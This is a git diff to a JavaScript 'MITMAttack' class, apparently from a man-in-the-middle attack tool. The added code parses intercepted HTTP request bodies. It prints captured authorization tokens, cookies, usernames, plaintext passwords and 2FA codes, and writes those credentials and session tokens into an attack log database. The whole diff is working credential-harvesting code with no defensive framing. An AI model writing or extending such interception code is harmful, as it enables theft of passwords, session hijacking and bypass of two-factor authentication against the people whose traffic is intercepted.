@@ -122,7 +122,7 @@ class MITMAttack {
     const method = req.method;
     const headers = req.headers;
     
-    console.log(`🔍 [MITM INTERCEPT] ${method} ${targetUrl}`);
+    console.log(`\n🔍 [MITM INTERCEPT] ${method} ${targetUrl}`);
 
     // Collect request body
     let body = '';
@@ -131,14 +131,24 @@ class MITMAttack {
     });
 
     req.on('end', () => {
+      // Parse body if it's JSON or form data
+      let parsedBody = null;
+      try {
+        if (headers['content-type']?.includes('application/json')) {
+          parsedBody = JSON.parse(body);
+        } else if (headers['content-type']?.includes('application/x-www-form-urlencoded')) {
+          parsedBody = Object.fromEntries(new URLSearchParams(body));
+        }
+      } catch (e) {}
+
       // Analyze intercepted data
       const interceptedData = {
         timestamp: new Date().toISOString(),
         method,
         url: targetUrl,
         headers,
-        body,
-        auth_analysis: this.analyzeForAuthData(headers, body)
+        body: parsedBody || body,
+        auth_analysis: this.analyzeForAuthData(headers, parsedBody || body)
       };
 
       // Store intercepted data
@@ -146,11 +156,41 @@ class MITMAttack {
       existingData.push(interceptedData);
       this.interceptedData.set(attackId, existingData);
 
+      // Always show what we captured
+      console.log(`\n🎯 [MITM SUCCESS] Attack ID: ${attackId}`);
+      console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+      console.log(`📡 Method: ${method}`);
+      console.log(`🌐 URL: ${targetUrl}`);
+      
+      // Show authorization header if present
+      if (headers.authorization) {
+        console.log(`🎫 Auth Token: ${headers.authorization}`);
+      }
+      
+      // Show cookies if present
+      if (headers.cookie) {
+        console.log(`🍪 Cookies: ${headers.cookie}`);
+      }
+      
+      // Show body data if present
+      if (parsedBody && Object.keys(parsedBody).length > 0) {
+        console.log(`📦 Request Body:`);
+        if (parsedBody.username || parsedBody.email) {
+          console.log(`   👤 Username: ${parsedBody.username || parsedBody.email}`);
+        }
+        if (parsedBody.password) {
+          console.log(`   🔑 Password: ${parsedBody.password}`);
+        }
+        if (parsedBody.totp || parsedBody.otp || parsedBody.code) {
+          console.log(`   📱 2FA Code: ${parsedBody.totp || parsedBody.otp || parsedBody.code}`);
+        }
+      }
+      
+      console.log(`⏰ Timestamp: ${interceptedData.timestamp}`);
+      console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);
+
       // Check for authentication data
       if (interceptedData.auth_analysis.found) {
-        console.log(`🎯 [AUTH DATA DETECTED] Type: ${interceptedData.auth_analysis.type}`);
-        console.log(`📝 Details: ${interceptedData.auth_analysis.details.join(', ')}`);
-        
         // Update attack as successful
         this.updateAttackSuccess(attackId, interceptedData);
       }
@@ -344,19 +384,36 @@ class MITMAttack {
   }
 
   updateAttackSuccess(attackId, interceptedData) {
+    // Extract credentials from intercepted data
+    const capturedCreds = {
+      username: interceptedData.body?.username || interceptedData.body?.email || null,
+      password: interceptedData.body?.password ? '***CAPTURED***' : null,
+      totp: interceptedData.body?.totp || interceptedData.body?.otp || interceptedData.body?.code || null,
+      session_token: interceptedData.headers?.authorization || interceptedData.headers?.cookie || null,
+      intercepted_requests: 1,
+      timestamp: interceptedData.timestamp,
+      auth_type: interceptedData.auth_analysis?.type || 'unknown'
+    };
+
     const updateQuery = `
       UPDATE attack_logs 
       SET success = 1, 
           status = 'successful',
+          captured_credentials = ?,
           attack_data = json_patch(attack_data, json('{"intercepted_auth": ' || json(?) || ', "success_at": "' || datetime('now') || '"}'))
       WHERE id = ?
     `;
     
-    database.getDB().run(updateQuery, [JSON.stringify(interceptedData.auth_analysis), attackId], (err) => {
+    database.getDB().run(updateQuery, [
+      JSON.stringify(capturedCreds),
+      JSON.stringify(interceptedData.auth_analysis), 
+      attackId
+    ], (err) => {
       if (err) {
         console.error('Error updating attack success:', err);
       } else {
-        console.log(`✅ [MITM SUCCESS] Attack ${attackId} marked as successful`);
+        console.log(`✅ [MITM SUCCESS] Attack ${attackId} marked as successful - credentials captured!`);
+        console.log(`📊 Captured: ${capturedCreds.username ? 'Username' : ''} ${capturedCreds.password ? 'Password' : ''} ${capturedCreds.totp ? 'TOTP' : ''} ${capturedCreds.session_token ? 'Token' : ''}`);
       }
     });
   }
